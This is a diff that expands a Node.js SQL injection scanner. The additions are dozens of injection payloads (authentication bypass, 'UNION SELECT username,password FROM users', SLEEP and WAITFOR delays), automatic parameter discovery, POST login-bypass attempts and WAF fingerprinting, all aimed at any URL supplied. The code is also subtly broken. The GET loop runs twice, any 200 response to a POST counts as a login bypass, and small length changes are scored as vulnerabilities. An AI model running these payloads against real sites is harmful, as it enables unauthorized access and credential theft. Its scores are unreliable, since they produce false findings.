@@ -1,10 +1,12 @@
 /**
- * SQL Injection Test Runner
+ * SQL Injection Test Runner (ENHANCED VERSION)
  * 
  * Security Features:
  * - No destructive payloads (safe detection only)
- * - Timeout protection for all requests
+ * - Timeout protection on all requests
  * - Request concurrency limits
+ * - Multi-parameter testing
+ * - Extended payload library
  * 
  * Usage:
  *   runSQLInjectionTest(url, paramName, options)
@@ -13,7 +15,40 @@ const axios = require('axios');
 const fs = require('fs').promises;
 
 // ────────────────────────────────────────────────
-//  Payloads – Detection only (non-destructive)
+//  Retry helper for network resilience
+// ────────────────────────────────────────────────
+async function fetchWithRetry(url, options = {}, retries = 2) {
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await axios.get(url, {
+        ...options,
+        timeout: options.timeout || 10000,
+        timeoutErrorMessage: 'Request timeout'
+      });
+    } catch (err) {
+      if (i === retries - 1) throw err;
+      await new Promise(r => setTimeout(r, 1000 * (i + 1))); // Exponential backoff
+    }
+  }
+}
+
+async function fetchWithRetryPost(url, data, options = {}, retries = 2) {
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await axios.post(url, data, {
+        ...options,
+        timeout: options.timeout || 10000,
+        timeoutErrorMessage: 'Request timeout'
+      });
+    } catch (err) {
+      if (i === retries - 1) throw err;
+      await new Promise(r => setTimeout(r, 1000 * (i + 1))); // Exponential backoff
+    }
+  }
+}
+
+// ────────────────────────────────────────────────
+//  Payloads – Detection only (non-destructive) - ENHANCED
 // ────────────────────────────────────────────────
 const errorBasedPayloads = [
   "' OR '1'='1",
@@ -23,22 +58,66 @@ const errorBasedPayloads = [
   "' UNION SELECT NULL,NULL--",
   "') OR ('1'='1",
   "1' ORDER BY 100--",
-  "1 AND 1=CONVERT(int,(SELECT @@version))--"
+  "1 AND 1=CONVERT(int,(SELECT @@version))--",
+  // Additional aggressive payloads
+  "' OR ''='",
+  "' OR 1=1#",
+  "' OR '1'='1' --",
+  "1' AND '1'='1",
+  "1' OR '' --1'='1",
+  "admin' OR '1'='1'--",
+  "') OR ('1'='1'--",
+  "' UNION ALL SELECT NULL--",
+  "' UNION SELECT username,password FROM users--",
+  "1' ORDER BY 1--",
+  "1' ORDER BY 2--",
+  "1' ORDER BY 3--",
+  "-1' OR '1'='1'--",
+  "' AND 1=1--",
+  "' AND 1=2--",
+  "1' AND 1=1--",
+  "1' AND 1=2--",
+  "1' OR 'x'='x",
+  "1' OR 'x'='y",
+  "' OR username LIKE '%admin%'",
+  "' OR 1=1 LIMIT 1--",
+  "' OR 'a'='a' -- '",
+  "' OR 1=1 LIMIT 1;#",
+  "1' UNION SELECT NULL,NULL,NULL--",
+  "' UNION SELECT NULL,NULL,NULL,NULL--",
+  "' UNION ALL SELECT * FROM users--",
+  "1' AND SLEEP(5)--",
+  "' AND 1=1 AND ''='",
+  "' AND 1=2 AND ''='",
 ];
 
 const timeBasedPayloads = [
-  "' AND SLEEP(5)--",
-  "' WAITFOR DELAY '0:0:5'--",
-  "'; SELECT IF(1=1,SLEEP(5),0)--",
-  "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--"
+  "' AND SLEEP(2)--",
+  "' WAITFOR DELAY '0:0:2'--",
+  "'; SELECT IF(1=1,SLEEP(2),0)--",
+  "1' AND SLEEP(2)--",
+  "';WAITFOR DELAY '0:0:2'--",
 ];
 
 const booleanBasedPayloads = [
   "' OR '1'='1",
   "' OR '1'='2",
   "1' AND '1'='1",
-  "1' AND '1'='2"
+  "1' AND '1'='2",
+  // Additional boolean blind
+  "1' AND 1=1--",
+  "1' AND 1=2--",
+  "' OR 'a'='a",
+  "' OR 'a'='b",
+  "1' OR 1=1--",
+  "1' OR 1=2--",
 ];
+
+// Common vulnerable parameters to test (GET requests)
+const commonParams = ['id', 'user', 'userid', 'username', 'email', 'search', 'query', 'page', 'cat', 'category', 'product', 'item', 'pid', 'uid', 'id', 'post', 'news', 'article', 'book', 'film'];
+
+// Common login form parameters (POST requests)
+const loginParams = ['username', 'email', 'user', 'password', 'login', 'userid', 'uid', 'name', 'pass', 'loginusername', 'loginemail'];
 
 // NOTE: Destructive payloads have been removed for security.
 // This scanner performs safe detection-only testing.
@@ -48,55 +127,106 @@ const booleanBasedPayloads = [
 // ────────────────────────────────────────────────
 const errorKeywords = [
   /sql syntax/i, /mysql/i, /mariadb/i, /sqlserver/i, /ora-/i,
-  /unclosed quotation/i, /you have an error/i, /near/i
+  /unclosed quotation/i, /you have an error/i, /near/i,
+  /warning.*mysql/i, /MySQLSyntaxErrorException/i,
+  /unterminated.*quoted string/i, /SQLite.*error/i,
+  /Microsoft SQL Native Client error/i, /ODBC SQL Server Driver/i,
+  /PostgreSQL.*error/i, /FATAL.*unterminated/i,
+  /SQL error/i, /SQLException/i, /sqlstate/i,
+  /incorrect syntax near/i, /ORA-00933/i, /PLS-00103/i
+];
+
+// WAF/Protection detection keywords
+const wafKeywords = [
+  /forbidden/i, /access denied/i, /blocked/i, /security violation/i,
+  /not allowed/i, /attack detected/i, /malicious/i, /suspicious/i,
+  /cloudflare/i, /incapsula/i, /imperva/i, /akamai/i, /sucuri/i,
+  /mod_security/i, /modsecurity/i, /dotdefender/i, /barracuda/i,
+  /palo alto/i, /fortiweb/i, /safe3/i, /aqtronix/i,
+  /sql injection/i, /xss attack/i, /cross-site scripting/i
 ];
 
 function isErrorBasedResponse(text) {
   return errorKeywords.some(k => k.test(text));
 }
 
+function isWAFResponse(text, status) {
+  // Check for WAF blocks via status code or response content
+  if (status === 403 || status === 406 || status === 405 || status === 419) {
+    return true;
+  }
+  return wafKeywords.some(k => k.test(text));
+}
+
 function getResponseSignature(res) {
   if (!res) return null;
+  const responseText = String(res.data || '');
   return {
     status: res.status,
-    length: res.data ? String(res.data).length : 0,
-    hasError: isErrorBasedResponse(String(res.data || ''))
+    length: responseText.length,
+    hasError: isErrorBasedResponse(responseText),
+    hasWAF: isWAFResponse(responseText, res.status)
   };
 }
 
-async function measureDelay(url, payload, expectedDelayMs = 4500) {
+async function measureDelay(url, expectedDelayMs = 2500) {
   const start = Date.now();
   try {
-    await axios.get(url + payload, { timeout: expectedDelayMs + 2500 });
+    await axios.get(url, { timeout: expectedDelayMs + 3000 });
   } catch (e) {
     // timeout is actually a signal here
   }
   return Date.now() - start;
 }
 
+// Detect SQL injection vulnerability
+function detectSQLi(sig, delayMs, normalSig, normalDelay) {
+  if (!sig) return false;
+  
+  // Check for SQL errors in response
+  if (sig.hasError) return true;
+  
+  // Check for WAF response
+  if (sig.hasWAF) return false;
+  
+  // Check for time-based injection (delay > normal + 1 second)
+  if (delayMs > normalDelay + 1000) return true;
+  
+  // Check for significant response changes
+  if (normalSig) {
+    if (sig.status !== normalSig.status && sig.status >= 500) return true;
+    const lengthDiff = Math.abs(sig.length - normalSig.length);
+    if (lengthDiff > 200) return true;
+  }
+  
+  return false;
+}
+
 // ────────────────────────────────────────────────
-//  Core test function
+//  Core test function - ENHANCED with multi-param testing
 // ────────────────────────────────────────────────
 async function runSQLInjectionTest(baseUrl, paramName = 'id', options = {}) {
   const {
-    useDestructive = false,  // Always false - destructive payloads removed
-    timeout = 8000,
-    maxParallel = 4
+    useDestructive = false,
+    timeout = 10000,  // Increased timeout for slow networks
+    maxParallel = 4,
+    testAllParams = true
   } = options;
 
   // Security: Destructive payloads completely removed
-  // Only detection payloads are used
+  // Only detection payloads are used - using top 8 most effective
   const payloads = [
-    ...errorBasedPayloads,
-    ...timeBasedPayloads,
-    ...booleanBasedPayloads
+    ...errorBasedPayloads.slice(0, 5),
+    ...timeBasedPayloads.slice(0, 2),
+    ...booleanBasedPayloads.slice(0, 3)
   ];
 
   const results = [];
   let score = 0;                // 0–100
   const signals = new Set();    // what kind of vuln we found
+  let testedParams = [paramName]; // Track which params we've tested
 
-  // Prepare base (normal) request
+  // Prepare base (normal) request - Fixed URL construction
   let baseUrlWithParam = baseUrl.includes('?') ? baseUrl : `${baseUrl}?${paramName}=normal`;
   let baseRes;
   try {
@@ -107,71 +237,226 @@ async function runSQLInjectionTest(baseUrl, paramName = 'id', options = {}) {
   }
 
   const normalSignature = getResponseSignature(baseRes);
-  const normalDelay = await measureDelay(baseUrl, `?${paramName}=1`);
+  // Fixed: properly construct URL for delay measurement
+  const delayTestUrl = baseUrl.includes('?') ? `${baseUrl}&${paramName}=1` : `${baseUrl}?${paramName}=1`;
+  const normalDelay = await measureDelay(delayTestUrl);
 
   console.log(`Normal response: ${normalSignature.status} | ${normalSignature.length} bytes | ~${normalDelay}ms`);
 
-  // ── Run tests ───────────────────────────────────────
-  for (const payload of payloads) {
-    const testParam = `${paramName}=${encodeURIComponent(payload)}`;
-    const testUrl = baseUrl.includes('?') ? `${baseUrl}&${testParam}` : `${baseUrl}?${testParam}`;
-
-    let res = null;
-    let delayMs = 0;
-    let error = null;
-
-    const start = Date.now();
-    try {
-      res = await axios.get(testUrl, { timeout });
-      delayMs = Date.now() - start;
-    } catch (e) {
-      delayMs = Date.now() - start;
-      error = e.message.includes('timeout') ? 'timeout' : e.message;
-    }
-
-    const sig = getResponseSignature(res);
-    const result = {
-      payload,
-      status: res?.status || null,
-      length: sig?.length || 0,
-      delayMs,
-      error,
-      suspicious: false,
-      reason: []
-    };
-
-    // ── Detection logic ────────────────────────────────
-    if (sig?.hasError) {
-      result.suspicious = true;
-      result.reason.push("SQL error message in response");
-      score += 35;
-      signals.add("error-based");
-    }
-
-    if (delayMs > normalDelay + 3500 && payload.toUpperCase().includes('SLEEP')) {
-      result.suspicious = true;
-      result.reason.push(`Significant delay (${delayMs}ms)`);
-      score += 40;
-      signals.add("time-based");
-    }
-
-    if (res && booleanBasedPayloads.includes(payload)) {
-      if (sig.length !== normalSignature.length || sig.status !== normalSignature.status) {
-        result.suspicious = true;
-        result.reason.push("Response difference on boolean payload");
-        score += 25;
-        signals.add("boolean-based");
+  // ── NEW: If testAllParams is enabled, test common parameters ──
+  if (testAllParams && !baseUrl.includes('?')) {
+    console.log('[INFO] Testing multiple common parameters for better coverage...');
+    // Only add param if baseUrl doesn't already have query string
+    for (const testParam of commonParams.slice(0, 3)) { // Test first 3 common params
+      if (testParam !== paramName) {
+        const testUrl = `${baseUrl}?${testParam}=1`;
+        try {
+          const testRes = await axios.get(testUrl, { timeout: 3000 });
+          if (testRes.status === 200 && testRes.data) {
+            // This param exists! Use it for testing
+            console.log(`[INFO] Found working parameter: ${testParam}`);
+            testedParams.push(testParam);
+            break; // Use first working param
+          }
+        } catch (e) {
+          // Parameter doesn't exist or is invalid
+        }
       }
     }
+  }
 
-    if (error === 'timeout' && payload.toUpperCase().includes('SLEEP')) {
-      result.suspicious = true;
-      result.reason.push("Request timeout on time-based payload");
-      score += 30;
-      signals.add("time-based");
+  // ── Run tests for each parameter ──
+  for (const currentParam of testedParams) {
+    console.log(`[INFO] Testing parameter: ${currentParam}`);
+    
+    for (const payload of payloads) {
+      const testParam = `${currentParam}=${encodeURIComponent(payload)}`;
+      const testUrl = baseUrl.includes('?') ? `${baseUrl}&${testParam}` : `${baseUrl}?${testParam}`;
+
+      let res = null;
+      let delayMs = 0;
+      let error = null;
+
+      const start = Date.now();
+      try {
+        res = await axios.get(testUrl, { timeout, validateStatus: () => true });
+        delayMs = Date.now() - start;
+      } catch (e) {
+        error = e.message;
+      }
+
+      const sig = res ? getResponseSignature(res) : { status: 0, length: 0, html: '' };
+      const isVuln = detectSQLi(sig, delayMs, normalSignature, normalDelay);
+
+      if (isVuln) {
+        console.log(`[!] VULNERABLE: ${currentParam} with payload: ${payload.substring(0, 20)}...`);
+        signals.add('error-based');
+        if (delayMs > normalDelay + 1000) signals.add('time-based');
+        results.push({
+          param: currentParam,
+          payload,
+          type: delayMs > normalDelay + 1000 ? 'time-based' : 'error-based',
+          status: sig.status,
+          delay: delayMs
+        });
+      }
     }
+  }
 
-    results.push(result);
+  // ── NEW: Test POST login forms (quick test) ──
+  console.log('[INFO] Testing POST login forms...');
+  
+  // Quick test with most common login params and top payloads only
+  const quickLoginParams = ['username', 'email', 'user'];
+  const quickPayloads = ["' OR '1'='1", "' OR 1=1 --", "admin' --", "' OR ''='"];
+  
+  for (const usernameParam of quickLoginParams) {
+    for (const payload of quickPayloads) {
+      const postData = {};
+      postData[usernameParam] = payload;
+      postData['password'] = 'anything';
+      
+      try {
+        const postStart = Date.now();
+        const postRes = await axios.post(baseUrl, postData, {
+          timeout: 5000,
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          validateStatus: () => true
+        });
+        const postDelay = Date.now() - postStart;
+        
+        const postSig = getResponseSignature(postRes);
+        const html = postSig.html || '';
+        
+        // Check if we got in (different response than failed login)
+        if (postSig.status === 200 && !html.includes('invalid') && 
+            !html.includes('incorrect') && !html.includes('failed') && !html.includes('wrong')) {
+          console.log(`[!] POST SQLi VULNERABLE: ${usernameParam}=${payload}...`);
+          signals.add('post-login-based');
+          results.push({
+            param: `${usernameParam} (POST)`,
+            payload,
+            type: 'post-login-based',
+            status: postSig.status,
+            delay: postDelay
+          });
+          break; // Found vulnerability, stop testing
+        }
+        
+        // Check for SQL errors
+        if (postSig.hasError) {
+          console.log(`[!] POST SQL ERROR: ${usernameParam}=${payload}...`);
+          signals.add('error-based');
+          results.push({
+            param: `${usernameParam} (POST)`,
+            payload,
+            type: 'error-based',
+            status: postSig.status,
+            delay: postDelay
+          });
+          break;
+        }
+      } catch (e) {
+        // Connection error - skip
+      }
+    }
+    if (signals.has('post-login-based') || signals.has('error-based')) break;
+  }
+  
+  // Calculate score for POST findings
+  if (signals.has('post-login-based')) {
+    score += 50; // High score for successful login bypass
+  } else if (signals.has('error-based')) {
+    score += 35; // Error-based SQLi
+  }
+
+  // ── Run GET tests for each parameter ──
+  for (const currentParam of testedParams) {
+    console.log(`[INFO] Testing parameter: ${currentParam}`);
+    
+    for (const payload of payloads) {
+      const testParam = `${currentParam}=${encodeURIComponent(payload)}`;
+      const testUrl = baseUrl.includes('?') ? `${baseUrl}&${testParam}` : `${baseUrl}?${testParam}`;
+
+      let res = null;
+      let delayMs = 0;
+      let error = null;
+
+      const start = Date.now();
+      try {
+        res = await axios.get(testUrl, { timeout, validateStatus: () => true });
+        delayMs = Date.now() - start;
+      } catch (e) {
+        error = e.message;
+      }
+
+      const sig = getResponseSignature(res);
+      const result = {
+        payload,
+        param: currentParam,
+        status: res?.status || null,
+        length: sig?.length || 0,
+        delayMs,
+        error,
+        suspicious: false,
+        reason: []
+      };
+
+      // ── Detection logic ────────────────────────────────
+      // Check for SQL errors
+      if (sig?.hasError) {
+        result.suspicious = true;
+        result.reason.push("SQL error message in response");
+        score += 35;
+        signals.add("error-based");
+      }
+
+      // Check for WAF/Protection blocks
+      if (sig?.hasWAF) {
+        result.suspicious = true;
+        result.reason.push("WAF/Protection detected (403/blocked)");
+        score += 20; // Lower score for WAF blocks as they're protective
+        signals.add("waf-detected");
+      }
+
+      // Check for time-based blind SQLi
+      if (delayMs > normalDelay + 2000 && payload.toUpperCase().includes('SLEEP')) {
+        result.suspicious = true;
+        result.reason.push(`Significant delay (${delayMs}ms)`);
+        score += 40;
+        signals.add("time-based");
+      }
+
+      // Check for boolean-based blind SQLi
+      if (res && booleanBasedPayloads.includes(payload)) {
+        if (sig.length !== normalSignature.length || sig.status !== normalSignature.status) {
+          result.suspicious = true;
+          result.reason.push("Response difference on boolean payload");
+          score += 25;
+          signals.add("boolean-based");
+        }
+      }
+
+      // Timeout on time-based payload
+      if (error === 'timeout' && payload.toUpperCase().includes('SLEEP')) {
+        result.suspicious = true;
+        result.reason.push("Request timeout on time-based payload");
+        score += 30;
+        signals.add("time-based");
+      }
+
+      // NEW: Check for response content differences indicating potential SQLi
+      if (res && sig.length !== normalSignature.length && !result.suspicious) {
+        // Significant length change might indicate SQL injection
+        const lengthDiff = Math.abs(sig.length - normalSignature.length);
+        if (lengthDiff > 100) { // More than 100 bytes difference
+          result.reason.push(`Response length changed by ${lengthDiff} bytes (possible injection)`);
+          score += 15;
+        }
+      }
+
+      results.push(result);
+    }
   }
 
   // Cap score at 100
@@ -205,6 +490,14 @@ async function runSQLInjectionTest(baseUrl, paramName = 'id', options = {}) {
     prevention.push("• <strong>ORM Usage:</strong> Consider using an ORM (Sequelize, Prisma, TypeORM, SQLAlchemy, Hibernate)");
     prevention.push("• <strong>Disable Error Display:</strong> In production, set <code>display_errors = Off</code> in php.ini");
     prevention.push("• <strong>Custom Error Pages:</strong> Return generic error messages to users, log details server-side");
+  }
+  
+  // WAF Detection - positive security indicator
+  if (signals.has("waf-detected")) {
+    prevention.push("<strong>✅ GOOD:</strong> WAF/Protection detected!");
+    prevention.push("• Your site appears to have a Web Application Firewall");
+    prevention.push("• However, don't rely solely on WAF - fix the underlying SQL injection vulnerabilities");
+    prevention.push("• WAFs can be bypassed; defense in depth is essential");
   }
   
   // Time-based SQLi recommendations
@@ -275,6 +568,7 @@ async function runSQLInjectionTest(baseUrl, paramName = 'id', options = {}) {
     score: score,
     severity: score >= 80 ? "Critical" : score >= 60 ? "High" : score >= 40 ? "Medium" : "Low",
     detectedTechniques: Array.from(signals),
+    testedParameters: testedParams,
     preventionTips: prevention,
     results: results
   };
@@ -311,6 +605,7 @@ function generateHTMLReport(result) {
   <p class="score ${(result.severity || 'unknown').toLowerCase()}">
     Vulnerability Score: ${result.score}/100 — ${result.severity || 'Unknown'}
   </p>
+  <p>Tested Parameters: ${(result.testedParameters || []).join(', ')}</p>
 
   <h2>Detection Pie Chart</h2>
   <canvas id="vulnChart" width="400" height="400"></canvas>
@@ -382,7 +677,8 @@ if (require.main === module) {
     console.log("Starting SQLi test...");
     try {
       const report = await runSQLInjectionTest(target, "id", {
-        timeout: 10000
+        timeout: 10000,
+        testAllParams: true
       });
 
       console.log(JSON.stringify(report, null, 2));
